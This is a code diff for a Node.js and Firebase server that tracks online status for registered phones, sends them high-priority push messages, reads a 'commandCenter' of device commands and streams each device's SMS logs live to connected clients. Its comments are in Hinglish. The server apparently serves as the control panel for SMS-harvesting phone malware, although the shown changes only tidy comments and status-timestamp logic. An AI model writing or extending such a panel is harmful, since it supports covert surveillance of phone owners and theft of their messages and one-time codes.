@@ -130,23 +130,19 @@ async function getAllBrosRepliesLive() {
       Object.entries(data).forEach(([uid, deviceData]) => {
         if (!deviceData || typeof deviceData !== 'object') return;
         
-        // ✅ checkedAt use karo for recency check
         const checkedAt = deviceData.checkedAt || 0;
         const lastSeen = deviceData.lastSeen || 0;
         const available = String(deviceData.available || "").toLowerCase().trim();
         
-        // Condition 1: Must be "device is online"
         const isOnline = available.includes("device is online");
-        
-        // Condition 2: Must be within last 15 minutes (using checkedAt)
         const isRecent = Number(checkedAt) > fifteenMinutesAgo;
         
         if (isOnline && isRecent) {
           activeDevices[uid] = { 
             uid, 
             ...deviceData,
-            checkedAt,  // ✅ checkedAt show karo
-            lastSeen,   // ✅ lastSeen show karo
+            checkedAt,
+            lastSeen,
             isActive: true
           };
           activeCount++;
@@ -156,7 +152,6 @@ async function getAllBrosRepliesLive() {
 
     console.log(`📡 [LIVE] Found ${activeCount} active devices in last 15 minutes`);
     
-    // Emit to all connected clients
     io.emit("checkOnline_all", activeDevices);
     
     return activeDevices;
@@ -181,7 +176,6 @@ io.on("connection", (socket) => {
     data: lastDevicesList,
   });
 
-  // ✅ Send initial active devices data
   setTimeout(async () => {
     const activeDevices = await getAllBrosRepliesLive();
     socket.emit("checkOnline_all", activeDevices);
@@ -207,7 +201,6 @@ io.on("connection", (socket) => {
     refreshDevicesLive(`deviceOnline:${id}`);
   });
 
-  // ✅ Client requests all checkOnline data
   socket.on("request_checkOnline_all", async () => {
     console.log("📡 Client requested checkOnline_all data");
     const activeDevices = await getAllBrosRepliesLive();
@@ -331,12 +324,8 @@ app.get("/api/brosreply/:uid", async (req, res) => {
 /* ======================================================
       ADMIN UPDATE PUSHER
 ====================================================== */
-/* ======================================================
-      ADMIN GLOBAL UPDATE (BATCHED FCM PUSH)
-====================================================== */
-
-const BATCH_SIZE = 50;       // 50 devices per batch
-const BATCH_DELAY = 2000;    // 2 seconds delay
+const BATCH_SIZE = 50;
+const BATCH_DELAY = 2000;
 
 function delay(ms) {
   return new Promise(res => setTimeout(res, ms));
@@ -420,62 +409,92 @@ rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandCh
 rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
 
 /* ======================================================
-      ⭐ CHECK ONLINE — UPDATED LOGIC ⭐
-      checkedAt: hamesha update hoga
-      lastSeen: sirf tab update hoga jab "device is online" aaye
+      ⭐ CHECK ONLINE — FIXED: lastSeen kabhi null nahi hoga ⭐
 ====================================================== */
 
 const checkCooldown = new Map();
-const COOLDOWN_MS = 5000; // 5 sec gap
+const COOLDOWN_MS = 5000;
 
 async function handleCheckOnlineChange(snap) {
   if (!snap.exists()) return;
 
   const uid = snap.key;
-  const data = snap.val() || {};
+  const newData = snap.val() || {};
   const now = Date.now();
 
-  // Debounce prevent duplicate quick triggers
+  // Debounce
   if (checkCooldown.has(uid) && now - checkCooldown.get(uid) < COOLDOWN_MS) {
     console.log("⏳ Skipped CHECK_ONLINE (cooldown):", uid);
     return;
   }
-
   checkCooldown.set(uid, now);
 
-  // ✅ Check if device is online based on available field
-  const isOnline = data.available && 
-                   String(data.available).toLowerCase().includes("device is online");
+  // ✅ Pehle se existing data check karo
+  const existingSnap = await rtdb.ref(`checkOnline/${uid}`).get();
+  const existingData = existingSnap.exists() ? existingSnap.val() : {};
+  
+  // ✅ Check if online
+  const isOnline = newData.available && 
+                   String(newData.available).toLowerCase().includes("device is online");
+  
+  // ✅ lastSeen logic: 
+  // - Agar online hai to update karo (current time)
+  // - Agar offline hai to PURANA time rakho, kabhi null nahi hoga
+  let lastSeen = existingData.lastSeen; // Purana time rakho initially
+  
+  if (!lastSeen) {
+    // Agar pehle kabhi lastSeen nahi tha to first time set karo
+    lastSeen = now;
+    console.log(`🆕 ${uid}: First time lastSeen set to ${new Date(lastSeen).toLocaleString()}`);
+  }
+  
+  if (isOnline) {
+    // Online hai to update karo
+    lastSeen = now;
+    console.log(`✅ ${uid}: Device is ONLINE, lastSeen updated to ${new Date(lastSeen).toLocaleString()}`);
+  } else {
+    // Offline hai to purana time rakho
+    console.log(`⏰ ${uid}: Device is OFFLINE, lastSeen RETAINED: ${lastSeen ? new Date(lastSeen).toLocaleString() : 'never'}`);
+  }
 
-  // ✅ Reset collection mein timestamp dalo (optional)
+  // ✅ Update checkOnline with both fields - lastSeen kabhi null nahi hoga
+  const updatedData = {
+    available: newData.available || "checking",
+    checkedAt: now,
+    lastSeen: lastSeen, // ✅ Kabhi null nahi, hamesha kuch na kuch time
+  };
+  
+  await rtdb.ref(`checkOnline/${uid}`).set(updatedData);
+  console.log(`💾 checkOnline updated for ${uid}:`, updatedData);
+
+  // Reset collection
   await rtdb.ref(`resetCollection/${uid}`).set({
     resetAt: now,
     readable: new Date(now).toString(),
     isOnline: isOnline
   });
 
-  // ✅ Status update karo - connectivity online rahega
+  // Status update
   await rtdb.ref(`status/${uid}`).update({
     connectivity: "Online",
-    lastSeen: now,  // status ka lastSeen hamesha update
+    lastSeen: now,
     timestamp: now,
   });
 
-  console.log(`♻️ CHECK ONLINE for ${uid}: isOnline=${isOnline}, checkedAt=${now}`);
+  console.log(`♻️ CHECK ONLINE for ${uid}: isOnline=${isOnline}, checkedAt=${now}, lastSeen=${lastSeen}`);
 
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
   if (token) {
     await sendFcmHighPriority(token, "CHECK_ONLINE", {
       uniqueid: uid,
-      available: data.available || "unknown",
-      checkedAt: String(data.checkedAt || now),
-      lastSeen: String(data.lastSeen || ""),
+      available: newData.available || "unknown",
+      checkedAt: String(now),
+      lastSeen: String(lastSeen),
       isOnline: String(isOnline)
     });
   }
   
-  // ✅ Trigger getAllBrosRepliesLive when checkOnline updates
   setTimeout(() => {
     getAllBrosRepliesLive();
   }, 1000);
@@ -649,7 +668,7 @@ historyRef.on("child_changed", (snap) => {
 });
 
 /* ======================================================
-      SMS LOGS LIVE UPDATE - FIXED VERSION
+      SMS LOGS LIVE UPDATE
 ====================================================== */
 const smsLogsRef = rtdb.ref("smsLogs");
 const processedSMSIds = new Set();
@@ -657,16 +676,12 @@ const processedSMSIds = new Set();
 function parseTimestamp(timestamp) {
   if (!timestamp) return Date.now();
   
-  // If it's already a number, return it
   if (typeof timestamp === 'number') return timestamp;
   
-  // If it's a string in date format, parse it
   if (typeof timestamp === 'string') {
-    // Try to parse as ISO date string
     const parsedDate = Date.parse(timestamp);
     if (!isNaN(parsedDate)) return parsedDate;
     
-    // Try to parse custom format: "2026-01-02 11:33:15"
     const dateMatch = timestamp.match(/(\d{4})-(\d{2})-(\d{2}) (\d{2}):(\d{2}):(\d{2})/);
     if (dateMatch) {
       const [, year, month, day, hour, minute, second] = dateMatch;
@@ -696,7 +711,6 @@ function emitLatestSmsUpdate(uid, smsId, smsData) {
   });
 }
 
-// Listen for ALL SMS changes, not just recent ones
 smsLogsRef.on("child_added", (snap) => {
   const uid = snap.key;
   const smsLogs = snap.val() || {};
@@ -734,9 +748,6 @@ smsLogsRef.on("child_changed", (snap) => {
     console.log(` Sending latest SMS: ${latestSmsId}, timestamp: ${numericTimestamp}`);
     emitLatestSmsUpdate(uid, latestSmsId, enhancedSmsData);
   }
-});
-
-smsLogsRef.on("child_changed", (snap) => {
 });
 
 setInterval(() => {
